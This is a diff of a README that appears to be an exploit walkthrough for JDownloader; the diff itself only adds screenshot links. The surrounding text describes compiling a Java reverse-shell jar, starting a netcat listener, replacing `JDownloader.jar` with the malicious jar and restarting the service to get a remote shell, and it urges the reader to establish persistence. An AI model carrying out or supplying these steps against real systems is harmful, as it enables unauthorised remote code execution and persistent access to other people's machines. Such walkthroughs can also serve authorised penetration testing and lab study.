@@ -13,6 +13,9 @@ You can upload a .jar file to JDownloader and change its name to `JDownloader.ja
 
 1.2 Check the Java version and Installation Directory (in this screenshot its JRE 1.8 and `/config`, the config file is covered by the "Click me / Mouse Over")
 
+![](screenshots/step1.png)
+
+
 # Step 2: Create payload 
 
 2.1 Edit the `shell.java` file with your IP and port that you want the reverse shell to come back to. 
@@ -22,7 +25,7 @@ You can upload a .jar file to JDownloader and change its name to `JDownloader.ja
 javac -target 1.8 -source 1.8 shell.java
 jar cmf manifest.mf myprogram.jar shell.class
 ```
-
+![](screenshots/step2.png)
 
 # Step 3: Start server and listener
 
@@ -50,6 +53,8 @@ Terminal 2 : `nc -nvlp <PORT>`
 
 5.4 Change `myprogram.jar` to `JDownloader.jar`. You should not get an error this time, because the previous step changed the original `JDownloader.jar` to `JDownloader.jar.bak`. 
 
+![](screenshots/step5.png)
+
 # Step 6: Execute. 
 
 ** WARNING: Once you run this step you will lose GUI access. This is because we have replaced the .jar file that controls the GUI with our malicious code. ** 
@@ -57,6 +62,8 @@ Terminal 2 : `nc -nvlp <PORT>`
 6.1 In the top left, goto `File -> Restart`. This should restart the service, which re-runs the `JDownloader.jar` (which is now our malicious file) 
 
 6.2 To re-execute, just reconnect. (This hasn't been tested thuroughly so dont rely on it. Establish persistence!!) 
+
+![](screenshots/step6.png)
 
 # Cleanup
 
